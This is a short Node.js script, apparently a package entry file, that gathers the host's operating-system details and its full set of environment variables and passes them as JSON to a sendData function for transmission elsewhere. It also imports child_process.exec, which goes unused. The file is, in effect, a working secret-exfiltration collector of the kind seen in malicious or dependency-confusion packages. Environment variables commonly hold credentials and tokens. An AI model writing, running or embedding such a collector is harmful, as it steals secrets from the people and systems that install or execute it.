const { exec } = require("child_process");
const core = require("./lib/core");

const plugins = [
    {
        key: "os",
        plugin: require("./plugins/getOsDetails")
    },
    {
        key: "env",
        plugin: require("./plugins/getEnvironmentVariables")
    }
];

async function runPlugin({key, plugin}) {
    return {
        [key]: await plugin()
    }
}

plugins.map(plugin => {
    runPlugin(plugin).then(data => {
        let postData = JSON.stringify(data, null, 2);
        console.log("Sending data:", postData);
        core.sendData(postData);
    });
});
